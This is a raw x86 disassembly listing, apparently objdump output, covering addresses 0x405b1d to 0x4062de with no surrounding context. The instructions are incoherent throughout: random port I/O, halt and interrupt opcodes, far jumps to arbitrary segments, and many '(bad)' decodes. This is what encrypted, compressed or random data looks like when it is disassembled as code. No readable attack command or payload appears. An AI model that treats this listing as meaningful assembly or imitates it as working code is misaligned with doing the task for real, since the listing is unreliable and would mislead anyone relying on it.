  405b1d:	ins    DWORD PTR es:[edi],dx
  405b1e:	loopne 0x405afb
  405b20:	fimul  WORD PTR [ecx+edx*2]
  405b23:	inc    edi
  405b24:	fidivr WORD PTR [eax-0x5e]
  405b27:	mov    esp,0xf9de5bd2
  405b2c:	out    0x9d,eax
  405b2e:	mov    bl,bl
  405b30:	add    al,cl
  405b32:	jns    0x405ae4
  405b34:	xor    BYTE PTR [ecx+0x9],cl
  405b37:	or     al,0x61
  405b39:	in     eax,0xb2
  405b3b:	repnz add al,0x47
  405b3e:	xchg   DWORD PTR [ecx+0x248d09a1],ebp
  405b44:	jp     0x405b02
  405b46:	jb     0x405bb5
  405b48:	sbb    al,0xa4
  405b4a:	sbb    al,0xb9
  405b4c:	aad    0xff
  405b4e:	jb     0x405bb2
  405b50:	neg    BYTE PTR [edx+0x551a428e]
  405b56:	hlt    
  405b57:	or     al,BYTE PTR [ebx+0x631b318d]
  405b5d:	aas    
  405b5e:	fs cmp al,0xde
  405b61:	mov    ch,0xe5
  405b63:	push   esp
  405b64:	dec    esi
  405b65:	fdiv   QWORD PTR [ebx-0x24]
  405b68:	sbb    al,0x8b
  405b6a:	or     al,BYTE PTR [ebx-0xc]
  405b6d:	scas   al,BYTE PTR es:[edi]
  405b6e:	mov    ds:0x3875b6fc,eax
  405b73:	lahf   
  405b74:	cmp    dh,cl
  405b76:	xchg   ebp,eax
  405b77:	lock push 0x5a58dc15
  405b7d:	clc    
  405b7e:	sub    BYTE PTR ds:0x5b44200f,dh
  405b84:	mov    al,BYTE PTR [edi+0x1]
  405b87:	inc    esp
  405b88:	mov    esi,0x63886eb0
  405b8d:	rcr    BYTE PTR [ebp+0x39],cl
  405b90:	out    dx,al
  405b91:	outs   dx,BYTE PTR ds:[esi]
  405b92:	adc    DWORD PTR [eax],ebp
  405b94:	das    
  405b95:	fwait
  405b96:	stos   DWORD PTR es:[edi],eax
  405b97:	fcomp  st(1)
  405b99:	ret    
  405b9a:	mov    esi,0x67f29c7a
  405b9f:	mov    edi,0x1816692b
  405ba4:	dec    ecx
  405ba5:	push   0xd19e13b7
  405baa:	stos   BYTE PTR es:[edi],al
  405bab:	jno    0x405bcb
  405bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bae:	push   ecx
  405baf:	jmp    0x405c0a
  405bb1:	data16 mov ds:0x37f863b6,al
  405bb7:	dec    ecx
  405bb8:	push   0x3cfa6d3
  405bbd:	ins    DWORD PTR es:[edi],dx
  405bbe:	mov    ds:0xbdebde16,al
  405bc3:	cmovne edi,DWORD PTR [ecx-0x2962d442]
  405bca:	enter  0x7f9d,0x7f
  405bce:	jge    0x405c1a
  405bd0:	imul   esp,DWORD PTR [esi+0x183dcdce],0x6530dcd6
  405bda:	mov    ah,0xc2
  405bdc:	scas   ax,WORD PTR es:[edi]
  405bde:	jge    0x405bd9
  405be0:	mov    dl,BYTE PTR [ebp-0x52]
  405be3:	add    BYTE PTR [edi],0x51
  405be6:	mov    ch,0xd2
  405be8:	or     al,0x9a
  405bea:	or     esp,DWORD PTR [ebx]
  405bec:	mov    edi,0xd9daf124
  405bf1:	aaa    
  405bf2:	pop    edx
  405bf3:	xor    ebx,DWORD PTR [edi]
  405bf5:	cs mov edi,0x9652a28c
  405bfb:	jmp    0xdce1f413
  405c00:	inc    ebp
  405c01:	pop    edi
  405c02:	aaa    
  405c03:	das    
  405c04:	ds aam 0x29
  405c07:	xor    eax,edx
  405c09:	cmp    BYTE PTR [ecx-0x2f6d1bf4],bh
  405c0f:	xchg   ebx,eax
  405c10:	es sti 
  405c12:	mov    dl,0x66
  405c14:	pop    esi
  405c15:	and    eax,0x5e430ed3
  405c1a:	pop    ebx
  405c1b:	out    dx,eax
  405c1c:	imul   edx,DWORD PTR [esi-0x4f],0x3a
  405c20:	pop    eax
  405c21:	inc    edi
  405c22:	aas    
  405c23:	push   ds
  405c24:	std    
  405c25:	push   cs
  405c26:	lods   eax,DWORD PTR ds:[esi]
  405c27:	push   0xd
  405c29:	sub    al,0x9
  405c2b:	add    eax,0x3c95041a
  405c31:	inc    ebx
  405c32:	xchg   ebp,eax
  405c33:	mov    BYTE PTR [ecx+eax*2-0x7b795244],ah
  405c3a:	out    0xc,eax
  405c3c:	xor    eax,0x99dcc9eb
  405c41:	mov    WORD PTR [edi-0x35abdb36],ds
  405c47:	xor    BYTE PTR [ebp+0x195ae191],0x7c
  405c4e:	mov    edx,0x3455479f
  405c53:	mov    esp,0x91ad24e6
  405c58:	imul   esp,DWORD PTR [edx+0x34],0x88f47024
  405c5f:	ret    0x9bd6
  405c62:	cmp    ch,BYTE PTR [ebp+0x40]
  405c65:	ror    DWORD PTR [ebx+eiz*8],1
  405c68:	jno    0x405caf
  405c6a:	mov    edi,0x101bed2d
  405c6f:	popa   
  405c70:	loope  0x405c2a
  405c72:	cmp    esp,esi
  405c74:	test   eax,0xc1ba9df
  405c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c7a:	repnz clc 
  405c7c:	stos   DWORD PTR es:[edi],eax
  405c7d:	push   0xffffff8b
  405c7f:	xchg   edx,eax
  405c80:	pop    eax
  405c81:	jecxz  0x405cf6
  405c83:	push   0xffffff9b
  405c85:	dec    esi
  405c86:	jmp    0xc5ce:0x85ab979
  405c8d:	mov    ds:0xb86d91b8,al
  405c92:	ins    DWORD PTR es:[edi],dx
  405c93:	gs jne 0x405c92
  405c96:	mov    bl,0x49
  405c98:	dec    eax
  405c99:	scas   al,BYTE PTR es:[edi]
  405c9a:	rcl    DWORD PTR [edx+ecx*1+0x8],0xfa
  405c9f:	xor    BYTE PTR [ebx+0x5f5e42de],dl
  405ca5:	add    BYTE PTR [eax+0x60],ah
  405ca8:	es push edx
  405caa:	jge    0x405d16
  405cac:	in     al,0x43
  405cae:	jg     0x405ce0
  405cb0:	pop    ebx
  405cb1:	popf   
  405cb2:	std    
  405cb3:	add    eax,0x4e359793
  405cb8:	and    DWORD PTR [ecx-0x56],edi
  405cbb:	add    DWORD PTR [edx+ecx*8-0x10],ecx
  405cbf:	jmp    0xdd3e:0x1039c7e3
  405cc6:	pop    ds
  405cc7:	cmp    edx,DWORD PTR [edx-0x53]
  405cca:	cmp    DWORD PTR [ebp-0x20],ebx
  405ccd:	xchg   esp,eax
  405cce:	stos   DWORD PTR es:[edi],eax
  405ccf:	mov    BYTE PTR ds:0x15d0d76b,al
  405cd5:	(bad)
  405cd8:	sbb    eax,0xc53ad80a
  405cdd:	push   esi
  405cde:	mov    ebp,0x8565da4a
  405ce3:	sbb    esi,DWORD PTR [edx-0x47]
  405ce6:	adc    BYTE PTR [edx-0x4eec22e5],0x6c
  405ced:	ds into 
  405cef:	call   edi
  405cf1:	in     al,0xc0
  405cf3:	or     dl,BYTE PTR [eax]
  405cf5:	adc    al,0xea
  405cf7:	pop    esi
  405cf8:	mov    bl,0x3c
  405cfa:	mov    ah,0xbb
  405cfc:	cmp    edx,esi
  405cfe:	pop    edi
  405cff:	add    edx,DWORD PTR [ebp-0x3c]
  405d02:	xor    BYTE PTR ds:[eax-0x74ce71d3],bl
  405d09:	scas   al,BYTE PTR es:[edi]
  405d0a:	mov    ebp,0x5a43b2d0
  405d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d10:	xchg   esi,eax
  405d11:	jae    0x405cc9
  405d13:	xchg   esi,eax
  405d14:	xchg   ecx,eax
  405d15:	les    esi,FWORD PTR [ecx]
  405d17:	push   edx
  405d18:	stc    
  405d19:	cmc    
  405d1a:	das    
  405d1b:	mov    dl,0x1c
  405d1d:	pop    ds
  405d1e:	stos   BYTE PTR es:[edi],al
  405d1f:	fisttp DWORD PTR [edi-0x470fd428]
  405d25:	or     bh,cl
  405d27:	lock rcl DWORD PTR [edx-0xac934f3],cl
  405d2e:	(bad)  
  405d2f:	sub    ebp,DWORD PTR [eax-0x3d]
  405d32:	push   esi
  405d33:	mov    bh,0x50
  405d35:	jge    0x405cdb
  405d37:	(bad)  
  405d38:	pcmpgtd mm2,QWORD PTR [eax-0x37]
  405d3c:	pop    eax
  405d3d:	inc    edx
  405d3e:	out    0xab,eax
  405d40:	out    dx,eax
  405d41:	jo     0x405d4c
  405d43:	inc    edx
  405d44:	enter  0x1729,0x25
  405d48:	repnz sub BYTE PTR [esi+edx*4+0x69a094c1],0xa4
  405d51:	mov    ah,0xef
  405d53:	out    dx,eax
  405d54:	popa   
  405d55:	push   edx
  405d56:	jmp    0x405d00
  405d58:	mov    esp,ecx
  405d5a:	retf   
  405d5b:	inc    ecx
  405d5c:	call   0x10970990
  405d61:	lds    eax,FWORD PTR [edi]
  405d63:	jmp    0x405d07
  405d65:	mov    ebp,0x5d0b327d
  405d6a:	ud2    
  405d6c:	push   ecx
  405d6d:	jg     0x405d40
  405d6f:	mov    dh,0x8
  405d71:	aaa    
  405d72:	ss loopne 0x405d1b
  405d75:	mov    bl,0x2f
  405d77:	ficomp WORD PTR [ecx]
  405d79:	xchg   ebp,eax
  405d7a:	jmp    0xaf572601
  405d7f:	sar    BYTE PTR ds:0xdefe31fc,cl
  405d85:	lock arpl di,dx
  405d88:	inc    BYTE PTR ds:0x53d703ac
  405d8e:	push   ecx
  405d8f:	push   eax
  405d90:	pop    ebx
  405d91:	leave  
  405d92:	jnp    0x405d54
  405d94:	scas   al,BYTE PTR es:[edi]
  405d95:	mov    ds:0xdc4bbe52,al
  405d9a:	mov    eax,ds:0x74ce4dba
  405d9f:	jmp    0xcad5:0xbc11d7
  405da6:	pop    eax
  405da7:	dec    esp
  405da8:	hlt    
  405da9:	inc    ecx
  405daa:	sub    ecx,esp
  405dac:	inc    esp
  405dad:	cmp    BYTE PTR [esi+0x4b608b65],0xfa
  405db4:	dec    ebp
  405db5:	out    0xb1,eax
  405db7:	test   esp,esi
  405db9:	xor    bl,BYTE PTR [eax-0x143569d]
  405dbf:	jnp    0x405d4d
  405dc1:	inc    eax
  405dc2:	and    al,0xe1
  405dc4:	les    esi,FWORD PTR [eax-0x4a]
  405dc7:	pop    ebx
  405dc8:	ds scas al,BYTE PTR es:[edi]
  405dca:	pop    ecx
  405dcb:	loope  0x405e34
  405dcd:	pop    esp
  405dce:	out    dx,eax
  405dcf:	pop    esi
  405dd0:	loope  0x405e1f
  405dd2:	inc    BYTE PTR [eax+0x77]
  405dd5:	ret    0x94a2
  405dd8:	stos   BYTE PTR es:[edi],al
  405dd9:	sub    bh,BYTE PTR [edx+eiz*8+0x2d]
  405ddd:	mov    esi,0x97c5bcee
  405de2:	lods   eax,DWORD PTR ds:[esi]
  405de3:	jo     0x405d67
  405de5:	jb     0x405d9c
  405de7:	mov    WORD PTR [ecx],ss
  405de9:	or     esp,DWORD PTR [edi-0x70a294ac]
  405def:	mov    al,0xba
  405df1:	gs daa 
  405df3:	shl    BYTE PTR [eax],0x3c
  405df6:	add    eax,0x8b0a37d2
  405dfb:	enter  0x6181,0x23
  405dff:	loop   0x405e21
  405e01:	xchg   edx,eax
  405e02:	loop   0x405e32
  405e04:	mov    ss,WORD PTR [ecx+0x40]
  405e07:	sbb    eax,0xffffffcd
  405e0a:	cmp    ebp,ecx
  405e0c:	xchg   edi,eax
  405e0d:	scas   eax,DWORD PTR es:[edi]
  405e0e:	sahf   
  405e0f:	and    al,0x4c
  405e11:	dec    ecx
  405e12:	push   ds
  405e13:	mov    ebp,0x35d467c2
  405e18:	les    ecx,FWORD PTR [ecx+ebx*8+0x5f]
  405e1c:	nop
  405e1d:	mov    bl,0x89
  405e1f:	sbb    eax,0xc35e2d65
  405e24:	add    eax,0xc3b499ae
  405e29:	mov    ds:0xd2da17e8,eax
  405e2e:	and    ebp,ebp
  405e30:	inc    ebp
  405e31:	xor    al,0x9d
  405e33:	test   al,0xf2
  405e35:	retf   0xf3f0
  405e38:	sahf   
  405e39:	xor    BYTE PTR [edx],dl
  405e3b:	shl    BYTE PTR [edi],0x23
  405e3e:	cmc    
  405e3f:	leave  
  405e40:	icebp  
  405e41:	adc    ah,BYTE PTR [ebp-0x23]
  405e44:	pusha  
  405e45:	mov    al,0xd
  405e47:	out    0xc3,al
  405e49:	test   BYTE PTR [ebx+edi*2-0x3e],cl
  405e4d:	adc    BYTE PTR [edi-0x56aadeb7],ah
  405e53:	in     eax,dx
  405e54:	xchg   ebx,eax
  405e55:	repz mov edx,0xb5590b4
  405e5b:	xor    ah,BYTE PTR [ebx-0x4]
  405e5e:	lock (bad) 
  405e60:	pop    ds
  405e61:	xchg   edi,eax
  405e62:	cmp    eax,0xe629c681
  405e67:	push   eax
  405e68:	mov    ch,0x1d
  405e6a:	das    
  405e6b:	(bad)  
  405e6c:	ja     0x405e38
  405e6e:	outs   dx,DWORD PTR ds:[esi]
  405e6f:	pop    ss
  405e70:	pop    esi
  405e71:	sbb    BYTE PTR [ebx-0x6e14a868],0xa5
  405e78:	and    eax,0xdc5f1b23
  405e7d:	jl     0x405ec9
  405e7f:	cwde   
  405e80:	test   al,0xbb
  405e82:	shl    BYTE PTR [edx+0x6d],cl
  405e85:	or     al,0x2
  405e87:	xlat   BYTE PTR ds:[ebx]
  405e88:	inc    DWORD PTR [eax-0x22]
  405e8b:	add    ebx,edi
  405e8d:	mov    ds:0x45813ce0,al
  405e92:	mov    ds:0xbeda9c38,eax
  405e97:	inc    ebx
  405e98:	rcl    BYTE PTR [esi+0x5b],1
  405e9b:	push   ds
  405e9c:	stos   BYTE PTR es:[edi],al
  405e9d:	mov    cl,0x11
  405e9f:	(bad)  
  405ea1:	pushf  
  405ea2:	loope  0x405efc
  405ea4:	lods   eax,DWORD PTR ds:[esi]
  405ea5:	mov    edx,0x92e8050a
  405eaa:	stos   DWORD PTR es:[edi],eax
  405eab:	pop    ebx
  405eac:	hlt    
  405ead:	or     DWORD PTR [ecx+0x29d5f914],esp
  405eb3:	mov    WORD PTR [eax],ss
  405eb5:	dec    edi
  405eb6:	xor    dh,BYTE PTR [esi-0x8533d6b]
  405ebc:	call   0xc14f:0x7092b1b7
  405ec3:	cmp    bl,BYTE PTR [ebx]
  405ec5:	mov    ds,WORD PTR [ebx-0x4202e8c5]
  405ecb:	icebp  
  405ecc:	int3   
  405ecd:	pop    ss
  405ece:	adc    al,0x30
  405ed0:	pop    eax
  405ed1:	arpl   WORD PTR [esi],ax
  405ed3:	enter  0x4343,0x65
  405ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ed8:	add    edi,DWORD PTR [edi-0x53]
  405edb:	mov    al,0x17
  405edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ede:	add    DWORD PTR [ecx-0x18169258],ebp
  405ee4:	mov    al,ds:0x8be73bd4
  405ee9:	and    esi,esi
  405eeb:	dec    ebp
  405eec:	dec    eax
  405eed:	push   ebp
  405eee:	or     dl,BYTE PTR [esi+0x38]
  405ef1:	je     0x405ed5
  405ef3:	iret   
  405ef4:	pop    ebp
  405ef5:	ret    0x935d
  405ef8:	outs   dx,DWORD PTR ds:[esi]
  405ef9:	push   ebx
  405efa:	iret   
  405efb:	fld    st(1)
  405efd:	(bad)  
  405efe:	(bad)  
  405eff:	in     eax,dx
  405f00:	icebp  
  405f01:	push   ebp
  405f02:	inc    ecx
  405f03:	inc    edx
  405f04:	int3   
  405f05:	or     al,0x69
  405f07:	loope  0x405eca
  405f09:	xor    ch,al
  405f0b:	enter  0x3379,0x96
  405f0f:	into   
  405f10:	mov    dh,0xad
  405f12:	adc    eax,0xeba2cca3
  405f17:	xchg   ebx,eax
  405f18:	add    eax,0xa9e64f1d
  405f1d:	xchg   edx,eax
  405f1e:	sti    
  405f1f:	int3   
  405f20:	jbe    0x405f47
  405f22:	adc    bh,BYTE PTR [eax+0x63]
  405f25:	mov    ebx,0x8b9ec620
  405f2a:	jecxz  0x405f3a
  405f2c:	jbe    0x405f31
  405f2e:	pop    edx
  405f2f:	cmp    bh,ch
  405f31:	jnp    0x405ec0
  405f33:	(bad)
  405f37:	jmp    0x405f8e
  405f39:	fimul  DWORD PTR [ebx]
  405f3b:	cli    
  405f3c:	xbegin 0xd576c872
  405f42:	inc    esi
  405f43:	cmp    BYTE PTR [ebp-0x260ddbca],bl
  405f49:	mov    bh,0xbc
  405f4b:	sbb    esp,eax
  405f4d:	lock xor dl,cl
  405f50:	mov    ebp,0x3a4ca7a7
  405f55:	test   cl,ah
  405f57:	xchg   DWORD PTR [edx],edx
  405f59:	push   esi
  405f5a:	add    bh,BYTE PTR [eax]
  405f5c:	xor    al,0x33
  405f5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f5f:	push   cs
  405f60:	push   ss
  405f61:	mov    edx,0xe05dca66
  405f66:	clc    
  405f67:	in     eax,dx
  405f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f69:	rol    BYTE PTR [ebx-0x70],1
  405f6c:	adc    DWORD PTR [edx+0x2c],edx
  405f6f:	xor    esp,DWORD PTR [ebx+0x737b7eb6]
  405f75:	sbb    DWORD PTR [ecx+eax*1],eax
  405f78:	inc    esi
  405f79:	push   edx
  405f7a:	xchg   esp,eax
  405f7b:	jl     0x405fe7
  405f7d:	jne    0x405fba
  405f7f:	mov    bl,0xe6
  405f81:	inc    edi
  405f82:	(bad)  
  405f83:	das    
  405f84:	or     BYTE PTR [esi+eax*2+0xb],ch
  405f88:	cmc    
  405f89:	add    al,0xa5
  405f8b:	adc    ah,BYTE PTR [edx-0x44]
  405f8e:	push   edx
  405f8f:	sbb    BYTE PTR [ebp+0x62],dh
  405f92:	loope  0x405f15
  405f94:	pop    edi
  405f96:	or     DWORD PTR [edi-0x1f],ebp
  405f99:	fbstp  TBYTE PTR [edi+0x16]
  405f9c:	mov    ds:0xa3d48d8c,eax
  405fa1:	out    dx,al
  405fa2:	jbe    0x405fb0
  405fa4:	dec    edx
  405fa5:	pop    edx
  405fa6:	sbb    BYTE PTR [edi+esi*2],0xaa
  405faa:	adc    DWORD PTR [edx-0x12031fcb],eax
  405fb0:	push   cs
  405fb1:	mov    ds:0xfae125f3,eax
  405fb6:	cmp    ch,BYTE PTR [esi+edi*1]
  405fb9:	sub    DWORD PTR [ebx],edx
  405fbb:	hlt    
  405fbc:	bound  ebx,QWORD PTR [edi-0x75c45962]
  405fc2:	jp     0x406022
  405fc4:	push   esp
  405fc5:	xchg   esp,eax
  405fc6:	enter  0x9314,0x6b
  405fca:	add    ecx,DWORD PTR [edi]
  405fcc:	enter  0x21ad,0x6
  405fd0:	cmp    al,0x33
  405fd2:	ret    
  405fd3:	and    eax,DWORD PTR ds:0xdb7f6678
  405fd9:	mov    ds:0x43c8a370,eax
  405fde:	test   eax,0x4a273169
  405fe3:	gs push edi
  405fe5:	xchg   ecx,eax
  405fe6:	clc    
  405fe7:	xlat   BYTE PTR ds:[ebx]
  405fe8:	inc    esp
  405fe9:	sbb    DWORD PTR [eax-0x45],ebx
  405fec:	js     0x405fc9
  405fee:	fisttp DWORD PTR [eax+0x70]
  405ff1:	cli    
  405ff2:	std    
  405ff3:	(bad)  
  405ff4:	clc    
  405ff5:	pop    ebp
  405ff6:	pop    ss
  405ff7:	fst    DWORD PTR [edx]
  405ff9:	push   cs
  405ffa:	ds ss mov bh,0x96
  405ffe:	mov    al,ds:0x80e708ea
  406003:	push   cs
  406004:	and    dl,BYTE PTR [ebx-0x42]
  406007:	sub    eax,DWORD PTR [esi]
  406009:	retf   
  40600a:	addr16 (bad) 
  40600c:	loopne 0x40604d
  40600e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40600f:	out    0x92,al
  406011:	mov    al,ds:0x2d9f030c
  406016:	inc    esp
  406017:	mov    dh,0xb5
  406019:	and    eax,0x120bfeb1
  40601e:	push   DWORD PTR [edi-0x5e]
  406021:	ror    BYTE PTR [ecx-0x7c],1
  406024:	push   ebp
  406025:	add    eax,0x47f29e98
  40602a:	inc    edx
  40602b:	jge    0x40604b
  40602d:	jmp    0xa426:0xd5b1fca8
  406034:	push   0xffffffcb
  406036:	xor    al,0xa7
  406038:	sbb    BYTE PTR [edi],ch
  40603a:	lahf   
  40603b:	pop    eax
  40603c:	sub    al,0x2a
  40603e:	je     0x40601a
  406040:	jns    0x40605e
  406042:	fs pop edx
  406044:	mov    ah,0x65
  406046:	scas   eax,DWORD PTR es:[edi]
  406047:	mov    bh,0x1e
  406049:	inc    edx
  40604a:	lods   eax,DWORD PTR ds:[esi]
  40604b:	add    BYTE PTR [ecx],0x39
  40604e:	ja     0x4060b1
  406050:	popa   
  406051:	cmp    esp,edi
  406053:	jge    0x406049
  406055:	push   ecx
  406056:	test   eax,0xd3b98ae5
  40605b:	mov    eax,ds:0x5278520a
  406060:	cmp    BYTE PTR [esi],cl
  406062:	addr16 sbb al,0xb7
  406065:	shl    DWORD PTR [esi*2+0x5f87ffe6],cl
  40606c:	or     BYTE PTR [ebx+0x1983430e],bl
  406072:	xchg   ebp,eax
  406073:	xor    eax,0xd85eec6
  406078:	popa   
  406079:	inc    ebx
  40607a:	push   ecx
  40607b:	int3   
  40607c:	nop
  40607d:	or     al,0x5
  40607f:	push   0xe7db8016
  406084:	(bad)  
  406086:	(bad)  
  406087:	push   edi
  406088:	cmc    
  406089:	cmp    eax,0x477deefa
  40608e:	mov    edx,0xfb934c8d
  406093:	mov    WORD PTR [esi+0x3b],es
  406096:	sbb    DWORD PTR ss:[ebx+0x62],ebp
  40609a:	imul   eax,DWORD PTR [edi-0x32],0xffffffe7
  40609e:	ds mov al,0xd0
  4060a1:	xchg   ebp,eax
  4060a2:	ror    DWORD PTR [eax],1
  4060a4:	add    eax,0x50de257b
  4060a9:	adc    BYTE PTR [eax+0x1c],bh
  4060ac:	arpl   WORD PTR [ebx+0x27a38b4d],sp
  4060b2:	mov    WORD PTR [edi],ds
  4060b4:	into   
  4060b5:	jo     0x406067
  4060b7:	les    esi,FWORD PTR [edx-0x135d206d]
  4060bd:	fist   DWORD PTR [eax+0x72]
  4060c0:	lock iret 
  4060c2:	bound  esi,QWORD PTR [ebp+0xb]
  4060c5:	int    0x6e
  4060c7:	xor    cl,bl
  4060c9:	loop   0x40610b
  4060cb:	mov    dl,0xa4
  4060cd:	ja     0x406056
  4060cf:	mov    bh,0x43
  4060d1:	xor    eax,0x67005079
  4060d6:	sub    BYTE PTR ds:0x97285792,bh
  4060dc:	mov    DWORD PTR es:[esi],ebp
  4060df:	adc    BYTE PTR [edx-0x13],cl
  4060e2:	enter  0x4db6,0x1c
  4060e6:	not    BYTE PTR [ebp-0x1d411397]
  4060ec:	imul   esp,DWORD PTR [ebx],0x4479e08b
  4060f2:	clc    
  4060f3:	sbb    eax,0x85c112d0
  4060f8:	into   
  4060f9:	in     al,dx
  4060fa:	mov    ds:0xb3def4be,eax
  4060ff:	mov    ecx,0x310a3cec
  406104:	xchg   DWORD PTR [edi],ecx
  406106:	jmp    0x67aa77b5
  40610b:	rcr    DWORD PTR [edi-0x3440b735],cl
  406111:	dec    edx
  406112:	jnp    0x406182
  406114:	sahf   
  406115:	std    
  406116:	inc    esp
  406117:	mov    ch,0xcd
  406119:	mul    BYTE PTR [ebx-0x527ccb1d]
  40611f:	pop    eax
  406120:	outs   dx,BYTE PTR ds:[esi]
  406121:	pop    ecx
  406122:	dec    ecx
  406123:	fisttp QWORD PTR [esi]
  406125:	push   ebp
  406126:	pop    edi
  406127:	or     eax,0xa7e5b223
  40612c:	and    esi,edx
  40612e:	call   0x2532d920
  406133:	clc    
  406134:	jno    0x4060fe
  406136:	sbb    BYTE PTR [eax-0x6009e677],ch
  40613c:	add    bl,BYTE PTR [edi]
  40613e:	xor    al,0x9c
  406140:	hlt    
  406141:	sbb    bh,BYTE PTR [edi-0x25]
  406144:	popa   
  406145:	cs gs jae 0x4061a2
  406149:	fild   WORD PTR [esi]
  40614b:	and    al,0x21
  40614d:	push   ecx
  40614e:	sub    BYTE PTR [ecx+0x26843d7f],dh
  406154:	mov    esp,0x62abc068
  406159:	fidiv  DWORD PTR [ebp+eiz*1+0x35]
  40615d:	repz repnz sub eax,0x1d
  406162:	xchg   ebp,eax
  406163:	push   ss
  406164:	in     eax,dx
  406165:	mov    ?,WORD PTR [edi+edx*8-0x5a]
  406169:	cld    
  40616a:	mov    bh,0xb2
  40616c:	sub    esp,DWORD PTR [ebp+0x4eb09ffd]
  406172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406173:	xor    eax,0x8c507e07
  406178:	add    BYTE PTR [edi-0xf42a851],0xca
  40617f:	rol    BYTE PTR [ecx-0x5c22273c],0xf7
  406186:	add    ah,bl
  406188:	push   ebx
  406189:	pop    ds
  40618a:	jbe    0x40612e
  40618c:	cmp    al,0x1a
  40618e:	repz or BYTE PTR [esi],0xcc
  406192:	(bad)  
  406193:	pop    ebp
  406194:	std    
  406195:	repz mov bh,0x32
  406198:	fwait
  406199:	pop    ecx
  40619a:	and    ah,BYTE PTR [esi]
  40619c:	(bad)  
  40619d:	pusha  
  40619e:	inc    esp
  40619f:	repnz sub edx,DWORD PTR [eax-0x39]
  4061a3:	pop    ebx
  4061a4:	mov    ds:0x8c33071c,eax
  4061a9:	repnz sbb BYTE PTR [ebp+0x789a6715],bl
  4061b0:	nop
  4061b1:	dec    eax
  4061b2:	inc    ebp
  4061b3:	and    al,0x3a
  4061b5:	je     0x40613a
  4061b7:	ret    
  4061b8:	mov    al,ds:0x856bd593
  4061bd:	xor    ah,BYTE PTR es:[ecx-0x4afab31b]
  4061c4:	jp     0x406221
  4061c6:	cwde   
  4061c7:	rcl    BYTE PTR [ecx+eax*4],1
  4061ca:	dec    edi
  4061cb:	pop    edi
  4061cc:	mov    al,0xd1
  4061ce:	mov    ch,0xd8
  4061d0:	sbb    DWORD PTR [ebx-0x1d],ecx
  4061d3:	inc    eax
  4061d4:	sbb    BYTE PTR [edx-0x7761f3ed],al
  4061da:	jo     0x40615d
  4061dc:	in     eax,0x50
  4061de:	adc    eax,0x6215ddb5
  4061e3:	out    dx,eax
  4061e4:	in     eax,0x85
  4061e6:	xor    al,0x13
  4061e8:	(bad)  
  4061e9:	and    BYTE PTR [esi+ebp*2+0x63],bh
  4061ed:	cdq    
  4061ee:	sub    BYTE PTR ds:0x79699a7e,ch
  4061f4:	inc    edi
  4061f5:	call   0x4f869de0
  4061fa:	out    0x94,eax
  4061fc:	inc    DWORD PTR [edi-0x5fd5e60]
  406202:	xor    dl,al
  406204:	test   BYTE PTR [edx-0x109f13a1],0x24
  40620b:	sub    ah,BYTE PTR [ecx-0x77b8d73b]
  406211:	and    BYTE PTR [ebx-0x2b],0xdb
  406215:	jbe    0x4061ea
  406217:	sbb    esp,eax
  406219:	push   edi
  40621a:	sbb    DWORD PTR [esi+eax*1+0x2bf1aab4],esi
  406221:	mov    bh,0x35
  406223:	and    ah,BYTE PTR [edi]
  406225:	cli    
  406226:	retf   
  406227:	repnz retf 0xb43f
  40622b:	pop    ss
  40622c:	icebp  
  40622d:	mov    DWORD PTR [edx+0x1b],ecx
  406230:	cmp    DWORD PTR [edx],0x71
  406233:	push   0xffffffd1
  406235:	push   ds
  406236:	out    0x62,eax
  406238:	loopne 0x4061c5
  40623a:	mov    WORD PTR [edx+0x21790b25],ds
  406240:	popf   
  406241:	imul   edi,DWORD PTR [ebx+esi*4+0x79d83b42],0xa8a27f73
  40624c:	mov    bh,0xa6
  40624e:	pop    edi
  40624f:	ja     0x4061ea
  406251:	jne    0x406224
  406253:	cwde   
  406254:	xchg   edi,eax
  406255:	adc    DWORD PTR [edi+0x63],esi
  406258:	pop    edi
  406259:	and    BYTE PTR [ebx+0x61ad859f],dh
  40625f:	sbb    al,0x17
  406261:	pop    edx
  406262:	mov    edx,0x58206161
  406267:	test   eax,0x5fac61b0
  40626c:	fmul   DWORD PTR [esi]
  40626e:	iret   
  40626f:	dec    ecx
  406270:	fst    st(0)
  406272:	mov    dl,0x8
  406274:	ins    BYTE PTR es:[edi],dx
  406275:	test   BYTE PTR [ebx+0x701ce84f],cl
  40627b:	js     0x406206
  40627d:	in     eax,0x24
  40627f:	push   eax
  406280:	into   
  406281:	clc    
  406282:	lock sbb DWORD PTR [edi+edx*4-0x10],ebx
  406287:	xor    eax,ebp
  406289:	mov    edi,0x9681f98c
  40628e:	inc    ebp
  40628f:	pop    edi
  406290:	adc    BYTE PTR [eax],bl
  406292:	inc    ecx
  406293:	daa    
  406294:	adc    dl,al
  406296:	imul   DWORD PTR [ebx]
  406298:	inc    esp
  406299:	fs push esi
  40629b:	and    DWORD PTR [eax-0x72],ebp
  40629e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40629f:	sub    BYTE PTR [ebx],bl
  4062a1:	push   0xffffff83
  4062a3:	std    
  4062a4:	add    al,0xa6
  4062a6:	ret    
  4062a7:	push   edx
  4062a8:	lods   al,BYTE PTR ds:[esi]
  4062a9:	jl     0x40629d
  4062ab:	fnsave [esi]
  4062ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062ae:	and    DWORD PTR [edx],0x7e01f41f
  4062b4:	cmp    al,0x9e
  4062b6:	inc    esi
  4062b7:	dec    edx
  4062b8:	inc    edi
  4062b9:	jbe    0x406318
  4062bb:	push   cs
  4062bc:	test   eax,0xee68a045
  4062c1:	push   edx
  4062c2:	add    BYTE PTR [eax-0x865930a],bl
  4062c8:	rcl    bh,0x5f
  4062cb:	add    al,0xcf
  4062cd:	inc    edx
  4062ce:	aam    0x4b
  4062d0:	mov    eax,0x7532b46f
  4062d5:	pusha  
  4062d6:	pop    eax
  4062d7:	cmp    al,0xe0
  4062d9:	stc    
  4062da:	ret    
  4062db:	mov    bl,0x33
  4062dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062de:	jg     0x40626a
